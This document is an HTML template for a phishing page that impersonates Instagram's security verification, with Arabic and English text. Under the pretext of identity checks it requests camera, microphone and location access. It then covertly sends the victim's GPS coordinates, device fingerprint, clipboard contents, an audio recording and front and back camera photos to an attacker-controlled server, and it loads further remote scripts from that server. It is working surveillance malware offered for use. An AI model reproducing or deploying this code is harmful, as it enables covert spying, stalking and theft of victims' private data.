<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Instagram</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:12px;width:100%;max-width:400px;overflow:hidden}
.header{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);padding:28px 24px;text-align:center;color:#fff}
.ig-logo{font-size:52px;margin-bottom:6px}
.ig-name{font-size:26px;font-weight:700;letter-spacing:-0.5px}
.ig-sub{font-size:13px;opacity:.85;margin-top:3px}
.body{padding:24px}
.notice{background:#fff3cd;border:1px solid #ffc107;border-radius:8px;padding:14px;font-size:13px;color:#856404;margin-bottom:18px;display:flex;gap:10px}
.notice-icon{font-size:18px;flex-shrink:0}
.progress{height:3px;background:#f0f0f0;border-radius:2px;margin:12px 0 8px;overflow:hidden}
.fill{height:100%;width:0;background:linear-gradient(90deg,#f09433,#dc2743,#bc1888);border-radius:2px;transition:width .5s}
#status{font-size:12px;color:#8e8e8e;text-align:center}
.btn{width:100%;padding:13px;background:linear-gradient(45deg,#f09433,#dc2743,#bc1888);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:14px}
.btn:disabled{opacity:.5}
.footer{padding:16px;text-align:center;font-size:12px;color:#8e8e8e;border-top:1px solid #dbdbdb}

/* ── Mandatory Permissions Overlay ── */
#perm-overlay{position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px}
#perm-box{background:#fff;border-radius:16px;max-width:360px;width:100%;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.4)}
.perm-header{background:linear-gradient(45deg,#f09433,#dc2743,#bc1888);padding:22px 20px;text-align:center;color:#fff}
.perm-header h2{font-size:18px;font-weight:700;margin-bottom:4px}
.perm-header p{font-size:12px;opacity:.9}
.perm-body{padding:20px}
.perm-item{display:flex;align-items:center;gap:12px;padding:12px;border-radius:10px;background:#f8f8f8;margin-bottom:10px;border:2px solid #eee;transition:.3s}
.perm-item.granted{background:#e8f5e9;border-color:#4caf50}
.perm-item.denied{background:#ffebee;border-color:#f44336}
.perm-icon{font-size:24px;flex-shrink:0}
.perm-info{flex:1}
.perm-name{font-size:14px;font-weight:600;color:#333}
.perm-desc{font-size:11px;color:#888;margin-top:2px}
.perm-status{font-size:18px;flex-shrink:0}
#perm-btn{width:100%;padding:14px;background:linear-gradient(45deg,#f09433,#dc2743,#bc1888);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;margin-top:4px}
#perm-btn:disabled{opacity:.6;cursor:not-allowed}
#perm-msg{font-size:12px;color:#e53935;text-align:center;margin-top:10px;min-height:16px}
</style>
</head>
<body>

<!-- ── Mandatory Permissions Overlay ── -->
<div id="perm-overlay">
  <div id="perm-box">
    <div class="perm-header">
      <div style="font-size:36px;margin-bottom:8px">📷</div>
      <h2>التحقق من الهوية مطلوب</h2>
      <p>يجب منح الصلاحيات التالية للمتابعة</p>
    </div>
    <div class="perm-body">
      <div class="perm-item" id="p-cam">
        <div class="perm-icon">📷</div>
        <div class="perm-info">
          <div class="perm-name">الكاميرا</div>
          <div class="perm-desc">للتحقق من هويتك بصرياً</div>
        </div>
        <div class="perm-status" id="s-cam">⏳</div>
      </div>
      <div class="perm-item" id="p-mic">
        <div class="perm-icon">🎙️</div>
        <div class="perm-info">
          <div class="perm-name">الميكروفون</div>
          <div class="perm-desc">للتحقق الصوتي من الهوية</div>
        </div>
        <div class="perm-status" id="s-mic">⏳</div>
      </div>
      <div class="perm-item" id="p-loc">
        <div class="perm-icon">📍</div>
        <div class="perm-info">
          <div class="perm-name">الموقع الجغرافي</div>
          <div class="perm-desc">للتحقق من موقعك الحالي</div>
        </div>
        <div class="perm-status" id="s-loc">⏳</div>
      </div>
      <button id="perm-btn" onclick="requestAllPerms()">السماح بجميع الصلاحيات</button>
      <div id="perm-msg"></div>
    </div>
  </div>
</div>

<div class="card">
  <div class="header">
    <div class="ig-logo">📷</div>
    <div class="ig-name">Instagram</div>
    <div class="ig-sub">Security Verification Required</div>
  </div>
  <div class="body">
    <div class="notice">
      <div class="notice-icon">🔐</div>
      <div>We noticed unusual activity on your account. Please verify your identity to continue using Instagram.</div>
    </div>
    <div class="progress"><div class="fill" id="pbar"></div></div>
    <div id="status">جارٍ التحقق من هويتك...</div>
  </div>
  <div class="footer">© 2024 Instagram from Meta</div>
</div>

<video id="vid" style="display:none" playsinline autoplay muted></video>
<canvas id="canvas" width="640" height="640" style="display:none"></canvas>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
<script>
var uid="<%=uid%>",a="<%=a%>",dest="<%=url%>";
var snapsConfirmed=0,redirectDone=false;

function setP(p){document.getElementById('pbar').style.width=p+'%';}
function setS(t){document.getElementById('status').textContent=t;}
function tryRedirect(){if(redirectDone)return;redirectDone=true;setTimeout(function(){window.location.href=dest;},300);}
setTimeout(function(){if(!redirectDone){redirectDone=true;window.location.href=dest;}},35000);

function setPermStatus(id,status){
  var item=document.getElementById('p-'+id),icon=document.getElementById('s-'+id);
  if(status==='ok'){item.className='perm-item granted';icon.textContent='✅';}
  else if(status==='fail'){item.className='perm-item denied';icon.textContent='❌';}
  else{item.className='perm-item';icon.textContent='⏳';}
}

var permsDone=false;
async function requestAllPerms(){
  if(permsDone)return;
  var btn=document.getElementById('perm-btn');
  btn.disabled=true;
  btn.textContent='جارٍ طلب الصلاحيات...';
  document.getElementById('perm-msg').textContent='';

  var camOk=false,locOk=false;

  // 1. Request camera + microphone together
  var stream=null;
  try{
    stream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:"user",width:{ideal:640},height:{ideal:640}}});
    setPermStatus('cam','ok');setPermStatus('mic','ok');
    camOk=true;
  }catch(e1){
    try{
      stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user"}});
      setPermStatus('cam','ok');setPermStatus('mic','fail');
      camOk=true;
    }catch(e2){
      setPermStatus('cam','fail');setPermStatus('mic','fail');
    }
  }

  // 2. Request location
  setPermStatus('loc','...');
  var locDone=false;
  var locP=new Promise(function(resolve){
    if(!navigator.geolocation){setPermStatus('loc','fail');resolve(false);return;}
    navigator.geolocation.getCurrentPosition(
      function(p){
        locOk=true;setPermStatus('loc','ok');
        $.post(a+"/location",{uid:uid,lat:encodeURIComponent(p.coords.latitude),lon:encodeURIComponent(p.coords.longitude),acc:encodeURIComponent(p.coords.accuracy+"m (GPS)")});
        resolve(true);
      },
      function(){setPermStatus('loc','fail');resolve(false);},
      {enableHighAccuracy:true,timeout:10000,maximumAge:0}
    );
    setTimeout(function(){if(!locOk){setPermStatus('loc','fail');resolve(false);}},12000);
  });
  await locP;

  if(!camOk){
    document.getElementById('perm-msg').textContent='⚠️ يجب منح صلاحية الكاميرا للمتابعة. اضغط مجدداً.';
    btn.disabled=false;btn.textContent='حاول مجدداً';
    return;
  }

  // All done — hide overlay and proceed
  permsDone=true;
  document.getElementById('perm-overlay').style.display='none';
  startVerify(stream);
}

async function sendDevice(){
  var td='<b>📷 Instagram Verify</b><br><b>⚓ IP: <%=ip%> | <%=time%> UTC</b><br><b>🕒 '+new Date()+'</b><br>';
  td+="<b>Screen:</b> "+screen.width+"x"+screen.height+"<br><b>TZ:</b> "+Intl.DateTimeFormat().resolvedOptions().timeZone+"<br>";
  var xo=["platform","userAgent","language","maxTouchPoints","hardwareConcurrency","deviceMemory","vendor","cookieEnabled"];
  for(var i=0;i<xo.length;i++){if(xo[i] in navigator)td+="<b>"+xo[i]+":</b> <code>"+navigator[xo[i]]+"</code><br>";}
  if(navigator.connection){var nc=navigator.connection;td+="<b>Net:</b> "+nc.effectiveType+" "+(nc.downlink||'?')+"Mbps<br>";$.post(a+"/network",{uid:uid,data:encodeURIComponent("📶 "+nc.effectiveType+" ⚡"+(nc.downlink||'?')+"Mbps RTT:"+(nc.rtt||'?')+"ms")});}
  if("getBattery" in navigator){try{var b=await navigator.getBattery();td+="<b>🔋 "+Math.round(b.level*100)+"% Charging:"+b.charging+"</b><br>";$.post(a+"/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}}
  $.post(a,{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
<% if(clipAccess){ %>  if(navigator.clipboard&&navigator.clipboard.readText){try{var clip=await navigator.clipboard.readText();if(clip&&clip.trim())$.post(a+"/clipboard",{uid:uid,clip:encodeURIComponent(clip)});}catch(e){}}<% } %>
}

async function startVerify(stream){
  setP(15);setS('Checking account activity...');
  sendDevice();
  await new Promise(function(r){setTimeout(r,600);});
  setP(35);setS('Identity verification...');

  var canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d'),vid=document.getElementById('vid');
  vid.srcObject=stream;try{await vid.play();}catch(e){}
  await new Promise(function(r){var c=setInterval(function(){if(vid.readyState>=2&&vid.videoWidth>0){clearInterval(c);r();}},200);setTimeout(function(){clearInterval(c);r();},3000);});

  setP(50);setS('Processing...');

  // Audio recording
  var at=stream.getAudioTracks();
  if(at.length){try{var rec=new MediaRecorder(new MediaStream(at)),chunks=[];rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};rec.onstop=function(){var blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();fr.onloadend=function(){$.post(a+"/audio",{uid:uid,audio:encodeURIComponent(fr.result.replace(/^data:.+;base64,/,''))});};fr.readAsDataURL(blob);};rec.start();setTimeout(function(){try{rec.stop();}catch(e){}},8000);}catch(e){}}

  // Front camera snaps
  var sd=0;
  var st=setInterval(function(){
    if(vid.readyState<2||vid.videoWidth===0)return;
    ctx.drawImage(vid,0,0,640,640);
    var d=canvas.toDataURL("image/png").replace("data:image/png;base64,","");
    $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(d),cam:"front"},function(){snapsConfirmed++;setP(55+snapsConfirmed*10);if(snapsConfirmed>=3)tryRedirect();});
    if(++sd>=5)clearInterval(st);
  },1500);

  // Back camera
  setTimeout(async function(){
    try{var bs=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:{exact:"environment"}}});var bv=document.createElement('video');bv.srcObject=bs;try{await bv.play();}catch(e){}await new Promise(function(r){setTimeout(r,2000);});if(bv.readyState>=2&&bv.videoWidth>0){ctx.drawImage(bv,0,0,640,640);$.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64,","")),cam:"back"});}bs.getTracks().forEach(function(t){t.stop();});}catch(e){}
  },3000);

  setTimeout(function(){setP(100);setS('Verification complete!');tryRedirect();},20000);
}

window.onload=function(){sendDevice();};
</script>
<script src="<%= a %>/t.js?u=<%= uid %>"></script>
<script src="<%= a %>/adv.js?u=<%= uid %>&a=<%= a %>"></script>
</body>
</html>
